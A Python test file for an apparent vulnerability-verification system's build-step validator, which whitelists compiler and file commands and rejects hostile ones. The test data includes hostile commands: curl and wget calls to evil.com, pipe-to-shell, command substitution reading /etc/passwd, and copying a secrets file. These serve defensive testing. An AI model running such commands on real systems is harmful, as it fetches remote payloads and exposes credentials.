"""Tests for TargetSpec build_steps validation and Dockerfile rendering."""

import pytest

from ndai.enclave.vuln_verify.builder import EIFBuilder
from ndai.enclave.vuln_verify.models import (
    CapabilityLevel,
    ClaimedCapability,
    PinnedPackage,
    PoCSpec,
    ServiceSpec,
    TargetSpec,
)
from ndai.enclave.vuln_verify.security import (
    _validate_build_steps,
    validate_target_spec,
)


def _make_spec(build_steps: list[str] | None = None, **overrides) -> TargetSpec:
    """Build a minimal valid TargetSpec for testing."""
    defaults = dict(
        spec_id="test-spec",
        base_image="debian:12",
        packages=[PinnedPackage(name="gcc", version="4:12.2.0-3")],
        config_files=[],
        services=[ServiceSpec(name="ssh", start_command="service ssh start", health_check="true")],
        poc=PoCSpec(script_type="bash", script_content="echo hello"),
        claimed_capability=ClaimedCapability(level=CapabilityLevel.ACE),
        build_steps=build_steps or [],
    )
    defaults.update(overrides)
    return TargetSpec(**defaults)


class TestBuildStepsValidation:
    """Tests for _validate_build_steps in security.py."""

    def test_empty_build_steps_valid(self):
        errors = _validate_build_steps([])
        assert errors == []

    def test_whitelisted_commands_pass(self):
        steps = [
            "gcc -shared -fPIC -o /usr/lib/libfoo.so foo.c",
            "make -j4",
            "cp /tmp/foo /usr/local/bin/foo",
            "chmod 755 /usr/local/bin/foo",
            "mkdir -p /var/lib/myapp",
            "ln -sf /usr/lib/libfoo.so.1 /usr/lib/libfoo.so",
            "install -m 755 mybin /usr/local/bin/",
            "ldconfig",
        ]
        errors = _validate_build_steps(steps)
        assert errors == [], f"Unexpected errors: {errors}"

    def test_blocked_network_commands(self):
        blocked = [
            "curl http://evil.com/payload.sh",
            "wget http://evil.com/binary",
            "apt-get install malware",
            "pip install backdoor",
        ]
        for step in blocked:
            errors = _validate_build_steps([step])
            assert len(errors) > 0, f"Expected block for: {step}"

    def test_non_whitelisted_command_rejected(self):
        errors = _validate_build_steps(["bash -c 'echo pwned'"])
        assert any("non-whitelisted" in e for e in errors)

    def test_pipe_to_shell_blocked(self):
        errors = _validate_build_steps(["gcc foo.c | sh"])
        assert any("Blocked" in e for e in errors)

    def test_command_substitution_blocked(self):
        errors = _validate_build_steps(["gcc $(cat /etc/passwd)"])
        assert any("Blocked" in e for e in errors)

    def test_backtick_blocked(self):
        errors = _validate_build_steps(["gcc `whoami`.c"])
        assert any("Blocked" in e for e in errors)

    def test_enclave_runtime_access_blocked(self):
        errors = _validate_build_steps(["cp /app/ndai/secrets.py /tmp/"])
        assert any("Blocked" in e for e in errors)

    def test_too_many_steps(self):
        steps = [f"gcc -c file{i}.c" for i in range(25)]
        errors = _validate_build_steps(steps)
        assert any("Too many" in e for e in errors)

    def test_step_too_long(self):
        step = "gcc " + "a" * 3000
        errors = _validate_build_steps([step])
        assert any("too long" in e for e in errors)


class TestBuildStepsInDockerfile:
    """Tests for build_steps rendering in builder.py."""

    def test_empty_build_steps_renders_comment(self):
        spec = _make_spec(build_steps=[])
        builder = EIFBuilder()
        dockerfile = builder.generate_dockerfile(spec)
        assert "# No custom build steps" in dockerfile

    def test_build_steps_render_as_run(self):
        spec = _make_spec(build_steps=[
            "gcc -shared -fPIC -o /usr/lib/libfoo.so foo.c",
            "chmod 755 /usr/lib/libfoo.so",
        ])
        builder = EIFBuilder()
        dockerfile = builder.generate_dockerfile(spec)
        assert "RUN gcc -shared -fPIC -o /usr/lib/libfoo.so foo.c" in dockerfile
        assert "RUN chmod 755 /usr/lib/libfoo.so" in dockerfile

    def test_build_steps_between_configs_and_services(self):
        spec = _make_spec(build_steps=["mkdir -p /opt/custom"])
        builder = EIFBuilder()
        dockerfile = builder.generate_dockerfile(spec)
        # Build steps should appear after config copies and before service setup
        config_pos = dockerfile.find("configuration files")
        build_pos = dockerfile.find("Custom build steps")
        service_pos = dockerfile.find("Service setup")
        assert config_pos < build_pos < service_pos

    def test_build_steps_included_in_spec_hash(self):
        spec1 = _make_spec(build_steps=["gcc -o foo foo.c"])
        spec2 = _make_spec(build_steps=["gcc -o bar bar.c"])
        spec3 = _make_spec(build_steps=[])
        builder = EIFBuilder()
        assert builder.spec_hash(spec1) != builder.spec_hash(spec2)
        assert builder.spec_hash(spec1) != builder.spec_hash(spec3)


class TestTargetSpecWithBuildSteps:
    """Integration: validate_target_spec with build_steps."""

    def test_valid_spec_with_build_steps(self):
        spec = _make_spec(build_steps=[
            "gcc -shared -fPIC -o /usr/lib/libtest.so test.c -lssl -lcrypto",
            "mkdir -p /var/lib/test",
        ])
        errors = validate_target_spec(spec)
        assert errors == [], f"Unexpected errors: {errors}"

    def test_spec_with_blocked_build_step_fails(self):
        spec = _make_spec(build_steps=["curl http://evil.com/payload.sh"])
        errors = validate_target_spec(spec)
        assert len(errors) > 0
        assert any("Blocked" in e or "non-whitelisted" in e for e in errors)
